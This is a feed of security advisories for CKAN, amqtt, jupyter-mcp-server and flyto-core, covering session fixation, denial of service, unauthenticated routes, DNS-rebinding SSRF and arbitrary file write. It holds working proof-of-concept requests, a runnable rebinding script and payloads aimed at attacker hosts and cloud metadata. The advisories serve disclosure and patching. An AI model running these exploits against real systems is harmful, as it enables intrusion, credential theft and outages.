items.content_html:
Description

Web user registration form is vulnerable to session fixation if the site is configured with server-side session storage (CKAN uses cookie-based session storage by default). The attacker would need to either set a cookie on the victim's browser or steal the victim's currently valid session. Session identifiers are now regenerated after registration.

Patches

This vulnerability has been fixed in CKAN 2.10.11, 2.11.6 and 2.12.0

Workarounds

switch to cookie-based session storage (the default) or disable web user registration by setting ckan.auth.create_user_via_web to false (the default)

items.content_html:
Impact

amqtt is vulnerable to a remote denial of service caused by incomplete MQTT QoS 2 transactions remaining allocated after the associated client disconnects.

MQTT QoS 2 uses a four-step handshake to provide exactly-once delivery. If a client begins a QoS 2 transaction but disconnects before the handshake completes, amqtt retains the associated transaction state and packet identifier without an expiration mechanism to remove it.

QoS 1 transactions are protected by a timeout mechanism, which defaults to 5 seconds, allowing abandoned state to be released. Equivalent timeout handling was not applied to incomplete QoS 2 transactions.

An attacker can repeatedly connect to the broker, initiate QoS 2 transactions, and disconnect before completing the handshake. Each incomplete transaction leaves state allocated in memory. Repeating this process causes broker memory consumption to grow continuously.

Successful exploitation can cause:

  • Unbounded growth in broker memory usage
  • Accumulation of incomplete QoS 2 transaction state
  • Increasing memory pressure on the host system
  • Termination of the broker process when available memory is exhausted
  • Operating-system Out-Of-Memory (OOM) intervention
  • Complete loss of availability for the affected broker process

Exploitation does not require maintaining long-lived connections. An attacker can create incomplete QoS 2 transactions and disconnect, leaving the broker to retain the associated state after the network connection has closed.

Under the default configuration, anonymous clients can exploit the vulnerability without credentials. When authentication is enabled, any authenticated client permitted to initiate QoS 2 message flows may still be able to exploit it. Authentication alone is therefore not a sufficient mitigation.

  • Ecosystem: pip
  • Package: amqtt
  • Affected versions: >= 0.11.0, <= 0.12.0

The vulnerable code is present in the v0.11.0 release commit, 352678c87e50e501a8a5bb91fab73c9400fa046c, and remained present on the main branch as of 5ebbf366f6b79ab12a06f426ffd18ff28954e4ea. Versions before 0.11.0 were not evaluated.

This is a denial-of-service vulnerability only. No confidentiality or integrity impact has been identified. Successful exploitation causes degradation and eventual loss of availability through memory exhaustion.

Patches

The issue will be been patched in the v0.12.1 released version; all users should upgrade.

The completed fix:

  • Apply transaction expiration handling consistently to incomplete QoS 1 and QoS 2 message flows
  • Expire abandoned QoS 2 state when the associated transaction does not complete within the configured timeout
  • Release the associated message state and packet identifiers when the transaction expires
  • Prevent disconnected clients from leaving incomplete QoS 2 transactions resident in broker memory indefinitely

The fixing commit is 2755fd801a6f95e9b73e11116948b57a95348466

Workarounds

Administrators who cannot immediately upgrade should limit the ability of untrusted clients to create large numbers of incomplete QoS 2 transactions.

Where application requirements permit, preventing untrusted clients from using QoS 2 provides the strongest temporary mitigation.

Connection and request rate limiting at a reverse proxy, load balancer, firewall, or other network layer can reduce the rate at which an attacker creates abandoned transactions, but does not eliminate the underlying vulnerability. An attacker able to continue creating incomplete QoS 2 transactions can still cause memory usage to increase over time.

Administrators should also monitor broker memory consumption and configure appropriate process or container memory limits to prevent exhaustion of host resources. Restarting the broker may reclaim abandoned state and restore availability, but the broker remains vulnerable until the patched version is installed.

MQTT Keep Alive limits are not a sufficient mitigation because the vulnerable state persists after the client connection has already terminated.

References

  • https://github.com/Yakifo/amqtt/security/advisories/GHSA-wcqj-wx85-c75p
  • https://nvd.nist.gov/vuln/detail/CVE-2026-130176

items.content_html:
Impact

amqtt is vulnerable to a remote denial of service caused by improper MQTT topic-filter validation combined with catastrophic regular-expression backtracking.

A single client can freeze the entire broker by sending one specially crafted SUBSCRIBE packet followed by one PUBLISH packet.

The vulnerability is caused by two defects:

  1. add_subscription() validates the placement of the single-level wildcard + using substring checks for /+ and +/, rather than verifying that each /-delimited level containing + is exactly +. This allows malformed filters such as "+/" + "+" * 60 to be accepted instead of rejected with return code 0x80, as required by MQTT-4.7.1-3.
  2. _matches() converts every + character into the greedy regular-expression fragment [^/]* and evaluates the resulting expression with re.fullmatch(). A filter containing many adjacent + characters can cause catastrophic backtracking when matched against a topic that partially matches but ultimately fails.

Topic matching runs synchronously inside the broker’s global broadcast loop. When the malicious match is evaluated, it blocks the asyncio event loop and prevents the broker from processing any other work.

The issue was reproduced using a single raw MQTT 3.1.1 TCP connection with no third-party client dependencies.

Successful exploitation causes:

  • Existing message delivery to stop
  • New MQTT connections to receive no CONNACK
  • Keepalive processing to stop
  • Broadcast processing to stop
  • The broker to remain unavailable until the process is restarted

Under the default configuration, anonymous clients can exploit the vulnerability without credentials. When authentication is enabled, any authenticated client permitted to create arbitrary subscriptions and publish messages may still exploit it. Authentication alone is therefore not a sufficient mitigation.

  • Ecosystem: pip
  • Package: amqtt
  • Affected versions: >= 0.11.0, <= 0.11.3

The vulnerable code is present in the v0.11.0 release commit, 352678c87e50e501a8a5bb91fab73c9400fa046c, and remained present on the main branch as of eeb1e254da9a1e8d9cc68ae754fcedac652e8fc0. Versions before 0.11.0 were not evaluated.

This is a denial-of-service vulnerability only. re.escape() prevents arbitrary regular-expression injection, and there is no known path to remote code execution.

No confidentiality or integrity impact has been identified. Successful exploitation causes a complete loss of availability for the affected broker process.

Patches

The issue has been patched in the v0.11.4 released version; all users should upgrade.

The completed fix:

  • Validate topic filters one level at a time
  • Require any level containing + to be exactly +
  • As part of comprehensive MQTT topic-filter validation, require # to occupy an entire level and appear only as the final level
  • Replace the regular-expression matcher with deterministic, level-by-level MQTT topic matching

Simply changing the validation logic is not sufficient defense in depth if malformed filters can reach the existing regular-expression matcher through another code path.

Workarounds

This is the temporary mitigation that was recommended prior to the patched release: administrators can install a topic-filtering plugin that rejects malformed wildcard subscriptions before they are added to the broker. Place the plugin in an importable Python module, enable it in the broker configuration, and restart the broker.

from amqtt.contexts import Action
from amqtt.plugins.base import BaseTopicPlugin
from amqtt.session import Session

class RejectInvalidTopicFilters(BaseTopicPlugin):
    """A plugin to prevent invalid wildcard subscriptions."""
    async def topic_filtering(
        self, *, session: Session | None = None,
        topic: str | None = None,
        action: Action | None = None
    ) -> bool | None:

        if topic and action == Action.SUBSCRIBE:
            levels = topic.split("/")
            return all(
                level in {"+", "#"} or ("+" not in level and "#" not in level)
                for level in levels
            ) and "#" not in levels[:-1]
        return True
        
config = {
    ...
    'plugins':{
        ...
        'myplugins.RejectInvalidTopicFilters': {}
    }
}

This workaround applies when subscription requests pass through the plugin. If the broker is configured to use a persistent session plugin, restarting the broker alone is not sufficient; any persisted sessions containing malformed topic filters need to be removed.

Restarting the broker restores availability after exploitation, but the broker remains vulnerable until the patch or workaround is installed.

Acknowledgments

aMQTT thanks the following security researchers for their professional, coordinated private disclosure:

  • Yongkang Xiao (Wuhan University)
  • Min Shi (Wuhan University)
  • Qiyi Deng (Wuhan University)
  • Jing Chen (Wuhan University)

items.content_html:
Standalone streamable-http mode in datalayer/jupyter-mcp-server rejects forged Host and Origin headers on /mcp, but custom management routes mounted on the same application do not get the same browser-origin protection. A malicious website can keep an attacker origin while its hostname resolves to 127.0.0.1 or a private target address, then send PUT /api/connect to replace the MCP server's active Jupyter backend. The route accepts the browser-shaped request and makes the server start a kernel client against attacker-controlled infrastructure.

The protected /mcp endpoint shows the intended browser-origin boundary. With MCP_TOKEN configured, /mcp rejects forged browser headers:

POST /mcp with Authorization: Bearer SCAN_MCP_TOKEN
Host: attacker.example:8142
Origin: http://attacker.example:8142

HTTP 421 Invalid Host header

The vulnerable route is jupyter_mcp_server/server.py:143-187. It parses caller JSON, updates the active Jupyter backend configuration, resets ServerContext, and starts the kernel without applying the /mcp Host/Origin rejection to the custom route:

@mcp.custom_route("/api/connect", ["PUT"])
async def connect(request: Request):
    data = await request.json()

    document_runtime = DocumentRuntime(**data)

    set_config(
        provider=document_runtime.provider,
        runtime_url=document_runtime.runtime_url,
        runtime_id=document_runtime.runtime_id,
        runtime_token=document_runtime.runtime_token,
        document_url=document_runtime.document_url,
        document_id=document_runtime.document_id,
        document_token=document_runtime.document_token,
        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or "notebook_run-all-cells,notebook_get-selected-cell"
    )

    ServerContext.reset()

    try:
        __start_kernel()
        return JSONResponse({"success": True})

/api/stop is also state-changing and accepts the same browser-origin route shape:

# jupyter_mcp_server/server.py:190-199
@mcp.custom_route("/api/stop", ["DELETE"])
async def stop(request: Request):
    try:
        current_notebook = notebook_manager.get_current_notebook() or "default"
        if current_notebook in notebook_manager:
            notebook_manager.remove_notebook(current_notebook)
        return JSONResponse({"success": True})

Proof of concept

Run the affected version with MCP_TOKEN configured:

git clone https://github.com/datalayer/jupyter-mcp-server
cd jupyter-mcp-server
git checkout 27b91e551d8bbca2da32c334f9f13267290ff815
python3.12 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
MCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \
  --transport streamable-http \
  --start-new-runtime false \
  --jupyterlab false \
  --mcp-token SCAN_MCP_TOKEN \
  --port 8083

First, show that /mcp rejects the browser-shaped request:

POST /mcp HTTP/1.1
Host: attacker.example:8083
Origin: http://attacker.example:8083
Authorization: Bearer SCAN_MCP_TOKEN
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}

Observed response:

HTTP/1.1 421
Invalid Host header

Now send the same browser-origin shape to the custom management route. In a browser DNS-rebinding attack, the attacker-controlled page keeps an attacker origin while the hostname resolves to 127.0.0.1 or the private MCP listener:

PUT /api/connect HTTP/1.1
Host: attacker.example:8083
Origin: http://attacker.example:8083
Content-Type: application/json

{
  "provider": "jupyter",
  "runtime_url": "http://127.0.0.1:9183",
  "runtime_id": "",
  "runtime_token": "ATTACKER_TOKEN_REBIND",
  "document_url": "http://127.0.0.1:9183",
  "document_id": "demo.ipynb",
  "document_token": "ATTACKER_TOKEN_REBIND"
}

Observed response:

HTTP/1.1 200 OK
content-type: application/json

{"success":true}

The server log shows that /api/connect accepted the attacker-chosen backend despite the browser-origin headers:

Connect endpoint received - runtime_url: 'http://127.0.0.1:9183',
document_url: 'http://127.0.0.1:9183', provider: jupyter
Starting the kernel client...
Default notebook kernel started successfully

When an attacker-controlled backend is listening on 127.0.0.1:9183, it receives Jupyter API traffic from the MCP server:

POST /api/kernels
Authorization: Bearer ATTACKER_TOKEN_REBIND

GET /api/kernels/fake-kernel/channels?...token=ATTACKER_TOKEN_REBIND

Impact

The protected /mcp endpoint rejects forged Host and Origin values, but adjacent custom routes accept them and perform sensitive state changes. A web attacker can use DNS rebinding to reach a local, LAN, VPN, or Docker-published MCP listener from the victim's browser, stop the current notebook kernel through /api/stop, replace the configured runtime_url and document_url through /api/connect, and cause the MCP server to initiate Jupyter API and WebSocket traffic to attacker-controlled infrastructure.

Why this is a vulnerability, not intended behavior

  • This is not a generic claim that /mcp lacks Host validation. /mcp rejects the forged Host replay with HTTP 421 Invalid Host header.
  • This is not a trusted MCP-client operation. The vulnerable path is a custom HTTP route outside normal JSON-RPC tool dispatch, and it accepts browser-shaped requests.
  • This is not only a broad-bind issue. The default 0.0.0.0 bind increases exposure, but the browser-origin boundary failure is that state-changing custom routes bypass the Host/Origin controls applied to /mcp.

Remediation

Apply the same browser-origin security policy to every route mounted on the standalone HTTP app:

  1. Enforce Host and Origin validation before custom routes parse request bodies or mutate global config.
  2. Require the MCP_TOKEN bearer token on /api/connect, /api/stop, /api/healthz, and any future custom route that reads or changes server state.
  3. Bind standalone HTTP to 127.0.0.1 by default, and require an explicit host allowlist for non-loopback listeners.
  4. Add regression tests proving that /api/connect and /api/stop reject forged browser Host and Origin headers.

References

  • https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-9x8x-crjq-g64h
  • https://nvd.nist.gov/vuln/detail/CVE-2026-77359
  • https://github.com/datalayer/jupyter-mcp-server/pull/262
  • https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4
  • https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3
  • https://github.com/advisories/GHSA-9x8x-crjq-g64h

Standalone streamable-http mode in datalayer/jupyter-mcp-server requires MCP_TOKEN for /mcp, but the custom management routes mounted on the same application do not enforce that token. An unauthenticated network caller can invoke PUT /api/connect, choose the Jupyter backend URL and token fields, reset the server context, and make the MCP server start a kernel client against attacker-controlled infrastructure. The same missing authentication affects the state-changing DELETE /api/stop route.

The intended authentication boundary is documented in the security guide and enforced during startup:

docs/docs/reference/security/index.mdx:15
All MCP endpoints require Bearer token authentication.

docs/docs/reference/security/index.mdx:25
Starting with version 1.0.0, MCP client authentication is required for the streamable-http transport.

The CLI enforces that boundary for the MCP endpoint:

# jupyter_mcp_server/CLI.py:203-209
if transport == "streamable-http" and not mcp_token and not insecure_mcp_noauth:
    raise click.UsageError(
        "streamable-http transport requires MCP client authentication. "
        "Set --mcp-token / MCP_TOKEN, or pass --insecure-mcp-noauth to "
        "explicitly allow unauthenticated access."
    )

# jupyter_mcp_server/CLI.py:285-290
if transport == "streamable-http":
    if mcp_token:
        from jupyter_mcp_server.server import RuntimeTokenVerifier
        mcp._token_verifier = RuntimeTokenVerifier(mcp_token)
        logger.info("MCP endpoint token authentication enabled (using MCP_TOKEN)")

The vulnerable route is jupyter_mcp_server/server.py:143-187:

@mcp.custom_route("/api/connect", ["PUT"])
async def connect(request: Request):
    data = await request.json()

    document_runtime = DocumentRuntime(**data)

    set_config(
        provider=document_runtime.provider,
        runtime_url=document_runtime.runtime_url,
        runtime_id=document_runtime.runtime_id,
        runtime_token=document_runtime.runtime_token,
        document_url=document_runtime.document_url,
        document_id=document_runtime.document_id,
        document_token=document_runtime.document_token,
        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or "notebook_run-all-cells,notebook_get-selected-cell"
    )

    ServerContext.reset()

    try:
        __start_kernel()
        return JSONResponse({"success": True})

/api/stop is also unauthenticated and state-changing:

# jupyter_mcp_server/server.py:190-199
@mcp.custom_route("/api/stop", ["DELETE"])
async def stop(request: Request):
    try:
        current_notebook = notebook_manager.get_current_notebook() or "default"
        if current_notebook in notebook_manager:
            notebook_manager.remove_notebook(current_notebook)
        return JSONResponse({"success": True})

Proof of concept

Run the affected version:

git clone https://github.com/datalayer/jupyter-mcp-server
cd jupyter-mcp-server
git checkout 27b91e551d8bbca2da32c334f9f13267290ff815
python3.12 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
MCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \
  --transport streamable-http \
  --start-new-runtime false \
  --jupyterlab false \
  --mcp-token SCAN_MCP_TOKEN \
  --port 8083

Send a request to the protected MCP endpoint without credentials:

POST /mcp HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}

Observed response:

HTTP/1.1 401 Unauthorized
www-authenticate: Bearer error="invalid_token", error_description="Authentication required"

Now send the unauthenticated management request:

PUT /api/connect HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: application/json

{
  "provider": "jupyter",
  "runtime_url": "http://127.0.0.1:9183",
  "runtime_id": "",
  "runtime_token": "ATTACKER_TOKEN_DIRECT",
  "document_url": "http://127.0.0.1:9183",
  "document_id": "demo.ipynb",
  "document_token": "ATTACKER_TOKEN_DIRECT"
}

Observed response:

HTTP/1.1 200 OK
content-type: application/json

{"success":true}

The server log shows that /api/connect accepted the attacker-chosen backend:

Connect endpoint received - runtime_url: 'http://127.0.0.1:9183',
document_url: 'http://127.0.0.1:9183', provider: jupyter
Starting the kernel client...
Default notebook kernel started successfully

When an attacker-controlled backend is listening on 127.0.0.1:9183, it receives Jupyter API traffic from the MCP server:

POST /api/kernels
Authorization: Bearer ATTACKER_TOKEN_DIRECT

GET /api/kernels/fake-kernel/channels?...token=ATTACKER_TOKEN_DIRECT

Impact

An attacker does not need the MCP_TOKEN to mutate the standalone MCP server's active backend connection. The attacker can stop the current notebook kernel through /api/stop, replace the configured runtime_url and document_url through /api/connect, and cause the MCP server to initiate Jupyter API and WebSocket traffic to attacker-controlled infrastructure.

For a same-network attacker, this is a direct unauthenticated state change against the HTTP listener. This defeats the documented standalone HTTP security boundary because the protected /mcp endpoint rejects missing credentials while adjacent management routes perform sensitive state changes without the same control.

Why this is a vulnerability, not intended behavior

  • This is not the explicit --insecure-mcp-noauth mode. The proof runs with MCP_TOKEN configured, and /mcp correctly returns 401 Unauthorized without it.
  • This is not a trusted MCP-client operation. The vulnerable path is a custom HTTP route outside normal JSON-RPC tool dispatch.
  • This is not only a broad-bind issue. The default 0.0.0.0 bind increases exposure, but the boundary failure is that state-changing custom routes bypass the token control applied to /mcp.

Remediation

Apply the same inbound authentication policy to every route mounted on the standalone HTTP app:

  1. Require the MCP_TOKEN bearer token on /api/connect, /api/stop, /api/healthz, and any future custom route that reads or changes server state.
  2. Bind standalone HTTP to 127.0.0.1 by default, and require an explicit host allowlist for non-loopback listeners.
  3. Add regression tests proving that /api/connect and /api/stop reject missing bearer tokens and invalid bearer tokens.

References

[MEDIUM] SSRF guard bypass via DNS rebinding — validate_url_ssrf resolves-then-connects without pinning

  • CWE: CWE-918 (SSRF) / CWE-367 (TOCTOU).
  • CVSS v3.1: AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N = 6.8 Medium (AC:H — needs attacker-controlled DNS with a low/zero TTL and to flip the answer between the guard's lookup and the connection's lookup; S:C — reaches internal/metadata services the guard is meant to block; C:H — e.g. cloud metadata credentials at 169.254.169.254).
  • Affected component: flyto-core (PyPI flyto-core), HEAD ae2b38e (v2.26.7). src/core/utils.py::validate_url_ssrf (resolution at getaddrinfo ~L512, is_private_ip check ~L515) and every consumer: guarded_aiohttp_request(), enforce_outbound_url()/validate_url_with_env_config() — i.e. http.get/request/batch, graphql.query/mutation, monitor.http_check, notification.{slack,discord,teams}, ai.vision_analyze, verify.visual_diff, browser.proxy_rotate, etc.
  • Relationship: Incomplete hardening of the SSRF-guard family (GHSA-pgwh-4jj4-qm8v, GHSA-c9hr-64h3-gxpc, GHSA-794r-5rp2-fpg8/CVE-2026-55787). Those fixes added per-module coverage, redirect revalidation, and IPv6-transition range-checks — but none pins the resolved address, so the guard's resolve-then-connect gap defeats all of them.

Root cause

validate_url_ssrf() resolves the hostname with socket.getaddrinfo() and rejects the URL if any resolved IP is private. It then returns the URL string (hostname intact). The caller (guarded_aiohttp_request: validate_url_with_env_config(url) then session.request(method, url, ...)) hands the hostname to aiohttp, which performs an independent second DNS resolution at connect time. The validated IP is never pinned for the connection, so an attacker whose authoritative DNS returns a public A record for the guard's lookup and a private/loopback/metadata address for the connection's lookup reaches internal space. aiohttp resolves via its own resolver, distinct from the guard's socket.getaddrinfo, so the two lookups are genuinely separate — one flip is sufficient.

Reachability

  1. Attacker controls DNS for rebind.attacker.test (TTL 0), and drives any guarded HTTP module with url=http://rebind.attacker.test/ (recipe / MCP execute_module).
  2. Guard: getaddrinfo → public IP → is_private_ip false → URL allowed.
  3. Outbound request: aiohttp re-resolves rebind.attacker.test → attacker now answers 127.0.0.1 / 169.254.169.254 → connects to the internal target. Redirect revalidation (GHSA-c9hr) does not help — the initial hop already rebinds.

Executable PoC (benign, local; deterministic)

The attacker's TTL=0 flip is modelled by making socket.getaddrinfo return public on lookup #1 (the guard's) and loopback on later lookups (the connection's); a raw local TCP sentinel stands in for the internal service. No payload is sent.

# (full source: findings/flyto-core/raw/poc_dns_rebinding.py)
# guard sees resolution #1 (public) -> ALLOWS;  connect re-resolves (127.0.0.1) -> hits sentinel
validate_url_ssrf("http://rebind.attacker.test:8080/")     # ALLOWED
socket.create_connection(("rebind.attacker.test", 8080))   # lands on 127.0.0.1 sentinel

Observed output:

[guard] validate_url_ssrf ALLOWED http://rebind.attacker.test:8080/  (saw public 93.184.216.34 on resolution #1)
[connect] outbound request re-resolved rebind.attacker.test -> 127.0.0.1 and reached the INTERNAL sentinel: True
BUG CONFIRMED: guard passed but connection reached the private/internal IP (DNS rebinding, no IP pin)

Adversarial re-read

  • Is the getaddrinfo monkeypatch cheating? No — it deterministically models an attacker's TTL=0 authoritative DNS returning different answers to two separate lookups. The code gap is real and unavoidable: validate_url_with_env_config(url) resolves once, then session.request(url) resolves again with no pin.
  • Does aiohttp's DNS cache prevent it? No — the guard's socket.getaddrinfo and aiohttp's resolver are independent; aiohttp caches its OWN (malicious) lookup, not the guard's.
  • Does redirect revalidation (GHSA-c9hr) block it? No — the first hop rebinds before any redirect.
  • Multiple A records? The guard loops all getaddrinfo results and rejects if any is private, so static multi-record does not bypass; only a time-of-use flip does.
  • Result: no concrete blocker. CONFIRMED (Medium; AC:H because it needs attacker DNS + a flip).

Remediation

Pin the validated address: resolve once, validate every returned IP, then connect to the pinned IP (not the hostname) — e.g. pass the resolved address to aiohttp via a custom resolver/TCPConnector (or set the Host header and connect by IP), so the guard's decision and the socket target are the same address. Apply for every hop in guarded_aiohttp_request. Alternatively, use a resolver wrapper that validates inside the connect path.

Confidence

High that the resolve-then-connect gap exists and the guard is bypassable by rebinding (PoC fires against the real guard). Severity Medium due to the AC:H rebinding precondition.

Proof-of-Concept source (poc_dns_rebinding.py)

"""PoC: DNS-rebinding SSRF bypass of validate_url_ssrf (resolve-then-connect, no IP pin).
Faithful & benign: a raw local TCP sentinel stands in for an internal service; socket.getaddrinfo
flips public->private across successive lookups exactly as an attacker TTL=0 DNS does.
The guard validates the FIRST resolution (public -> passes) while the CONNECT re-resolves to the
sentinel (private) -> internal reach that the guard was supposed to block."""
import os, sys, socket, threading, time
sys.path.insert(0, os.path.join(os.getcwd(), "src"))
from core.utils import validate_url_ssrf, SSRFError

# 1) internal "service" sentinel: raw TCP listener on loopback
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
import errno
for _p in (8080, 8443):
    try:
        srv.bind(("127.0.0.1", _p)); break
    except OSError:
        continue
else:
    raise SystemExit("no allowed port free")
srv.listen(1)
PORT = srv.getsockname()[1]
hit = {"internal": False}
def accept_once():
    try:
        c,_ = srv.accept(); hit["internal"] = True; c.close()
    except OSError:
        pass
threading.Thread(target=accept_once, daemon=True).start()

HOST = "rebind.attacker.test"
PUBLIC = "93.184.216.34"   # example.com, public -> guard must ALLOW

# 2) attacker DNS: 1st lookup (the guard's) => public; later lookups (the connect's) => 127.0.0.1
_real = socket.getaddrinfo
calls = {"n": 0}
def flipping_getaddrinfo(host, port, *a, **k):
    if host == HOST:
        calls["n"] += 1
        ip = PUBLIC if calls["n"] == 1 else "127.0.0.1"
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port or 0))]
    return _real(host, port, *a, **k)
socket.getaddrinfo = flipping_getaddrinfo

# 3) GUARD runs (resolves #1 = public) -> should PASS
try:
    validate_url_ssrf(f"http://{HOST}:{PORT}/")
    print(f"[guard] validate_url_ssrf ALLOWED http://{HOST}:{PORT}/  (saw public {PUBLIC} on resolution #1)")
except SSRFError as e:
    print("[guard] blocked (rebinding not effective):", e); sys.exit(0)

# 4) the actual outbound CONNECT re-resolves (#2 = 127.0.0.1) -> lands on the internal sentinel
try:
    s = socket.create_connection((HOST, PORT), timeout=3); s.close()
except OSError as e:
    print("[connect] error:", e)
time.sleep(0.2)
socket.getaddrinfo = _real
print(f"[connect] outbound request re-resolved {HOST} -> 127.0.0.1 and reached the INTERNAL sentinel: {hit['internal']}")
print("BUG CONFIRMED: guard passed but connection reached the private/internal IP (DNS rebinding, no IP pin)"
      if hit["internal"] else "NOT CONFIRMED")
srv.close()

Summary

http.paginate validates only the initial base_url, then follows server-supplied pagination targets (RFC 5988 Link: rel="next" headers, cursor/offset URLs) in a loop without revalidating each follow-up URL. An attacker's first-page response can point next at an internal address, causing a second-order SSRF whose internal body is aggregated into the returned items.

Root Cause

src/core/modules/atomic/http/paginate.py:495 validates base_url (first URL only). The pagination loop _paginate_link_header reads next_url via _parse_link_header (:203), sets url=next_url (:208), and calls session.request(method, url) (:196) with NO validate call in the loop (:186-208 has zero guard calls).

Impact

Readable second-order SSRF that bypasses the SSRF control; internal/metadata body aggregated into all_items and returned to the caller (C:H, S:C).

Proof of Concept

Verified live: http.paginate with allowlisted base 127.0.0.1 followed a Link: <http://127.0.0.3/...>; rel="next" (non-allowlisted) and returned INTERNAL-NEXTPAGE-SECRET in the aggregated items.

execute_module http.paginate {"url":"http://attacker.tld/p1","strategy":"link_header"}
attacker p1 response header: Link: <http://<cloud-metadata-ip>/latest/meta-data/>; rel="next"

Attack Chain

  1. Entry: http.paginate {url:"http://attacker.tld/p1", strategy:"link_header"}. Guard: validate_url_with_env_config(base_url) (paginate.py:495) — validates the FIRST url only.
  2. Sink: _paginate_link_header reads next_url (_parse_link_header :203), url=next_url (:208), session.request(method,url) (:196) — NO validate call in the loop. Bypass proof: only :495 validates; loop at :186-208 has zero guard calls.
  3. Impact: internal body aggregated into all_items and returned → readable second-order SSRF.

Bypass Evidence

Live PoC followed a Link header into non-allowlisted loopback and returned the internal marker in aggregated results. Only base_url is validated; the follow loop never revalidates.

Affected Versions

<= 2.26.6 — paginate.py:495 + loop present on latest release tag.

Suggested Fix

Run every follow-up URL (Link header, cursor, offset target) through validate_url_with_env_config before fetching it inside the pagination loop.

Credit

Vulnerability discovered by zx (Jace).

items.content_html:
Summary

validate_url_ssrf resolves the hostname, checks the IP against private ranges, then discards the IP and returns the hostname URL string. aiohttp performs a fresh, independent DNS resolution at connect time. An attacker controlling DNS for a hostname (TTL 0, alternating public IP and internal IP) passes validation on the first lookup and connects to the internal IP on the second — a classic check-then-use race. SECURITY_SSRF.md line 63 explicitly claims DNS-rebinding is prevented; it is not.

Root Cause

src/core/utils.py:523 returns the hostname URL after validation; the resolved IP is never pinned. A repo grep of http/ and utils.py for TCPConnector / resolver / response.history / on_request_redirect / IP-pinning returns NONE. Each module builds a fresh ClientSession per call → the connect-time getaddrinfo is independent of the validation-time lookup.

Impact

Defeats the SSRF guard on ALL modules that call it (readable internal fetch). Independent of IP-range completeness — the private IP is never presented to is_private_ip. Requires attacker DNS control + winning the resolution race → AC:H.

Proof of Concept

Code-proven: validate_url_ssrf returns the hostname (utils.py:523); no pinned-IP connector anywhere. Two independent resolutions occur (validation-time and aiohttp connect-time).

attacker DNS: rebind.attacker.tld TTL 0, alternating public IP and the cloud metadata IP
execute_module http.get {"url":"http://rebind.attacker.tld/latest/meta-data/..."}

Attack Chain

  1. Entry: http.get {url:"http://rebind.attacker.tld/..."}. Guard: validate_url_with_env_config. Bypass proof: getaddrinfo(rebind.attacker.tld) returns the public IP, is_private_ip=False (utils.py:511-519); returns the hostname URL (:523) — the IP is discarded.
  2. Sink: session.get("http://rebind.attacker.tld/...") (get.py:116). aiohttp performs a FRESH independent getaddrinfo at connect → now resolves to the internal IP. Bypass proof: no TCPConnector/AsyncResolver/pinned-IP in http/ (grep confirms none). Two lookups.
  3. Impact: internal fetch, body returned.

Bypass Evidence

utils.py:523 returns the hostname string, not a pinned IP; grep confirms no IP pinning or custom resolver anywhere on the path; fresh ClientSession per call guarantees an independent second resolution.

Affected Versions

<= 2.26.6 — utils.py:523 present on latest release tag; no pinning added on HEAD.

Suggested Fix

Resolve the hostname once, pin the validated IP, and connect to that IP (custom TCPConnector/resolver) — reject any connect-time resolution that differs. This is the fix SECURITY_SSRF.md already claims is in place.

Credit

Vulnerability discovered by zx (Jace).

[CRITICAL] Arbitrary file write via unguarded data.* / file.* write modules — incomplete fix of GHSA-2956

  • CWE: CWE-22 (Path Traversal) / CWE-73 (External Control of File Name or Path); impact reaches CWE-94 (code execution via file overwrite).
  • CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.3 Critical (S:C because a write escapes the intended sandbox confinement into the host filesystem / other components).
    • AV:N — reachable via the MCP server / recipe engine (execute_module). AC:L — deterministic. PR:L — any client able to run a module/recipe (the same attacker model as GHSA-2956; unauthenticated on the HTTP MCP surface per CVE-2026-55786). UI:N. S:C — escapes FLYTO_SANDBOX_DIR. C/I/A:H — arbitrary-content write to any absolute path → overwrite app code / recipes / ~/.bashrc / cron / authorized_keys → RCE.
  • Affected component: flyto-core (PyPI flyto-core), HEAD ae2b38e (v2.26.7 line). Modules data.csv.write (src/core/modules/atomic/data/csv_write.py), data.json_to_csv (.../data/json_to_csv.py), file.copy (.../file/copy.py), file.move (.../file/move.py) — and the broader data.*/file.*/report-writer families that do not call the path guard.
  • Relationship: Incomplete fix of GHSA-2956-977x-2w3r (Critical arbitrary file write, patched in v2.26.6 by commit d5f89d7). That fix routed a hand-picked module list (image.download/convert/resize/crop/compress/rotate/watermark/qrcode_generate, document.excel_write/pdf_fill_form/word_to_pdf/pdf_to_word, browser.pagination checkpoint) through validate_path_with_env_config(). It did not cover the data.* and file.* write families, which still write a client-controlled path with no confinement.

Reachability (hop-by-hop, guards resolved)

  1. Client invokes a module via the recipe engine / MCP execute_module (src/core/mcp_handler.py, mcp_server.py) — the same surface as GHSA-2956 / CVE-2026-55786.
  2. data.csv.write reads file_path = params.get('file_path') and data (both client-controlled). Its only path check is if '..' in file_path: raise — a denylist that does not block absolute paths.
  3. It calls os.makedirs(os.path.dirname(file_path), exist_ok=True) then open(file_path, 'w') and writes data. No call to validate_path_with_env_config() — so FLYTO_SANDBOX_DIR confinement is never applied.
  4. data.json_to_csv (output_path), file.copy / file.move (shutil.copy2/shutil.move to destination) have no path check at all.
  5. An absolute path such as /home/<user>/.bashrc, /app/src/core/modules/.../<mod>.py, or a .flyto recipe file is written verbatim, outside the sandbox.

Guard analysis: the GHSA-2956 enforcement is per-module (e.g. image/download.py:21 imports and calls validate_path_with_env_config). There is no central path enforcement in the runtime — runtime/languages.py's PathTraversalError guards plugin entry-point loading, not module output paths. So a module that omits the per-module call is entirely unconfined.

Root cause

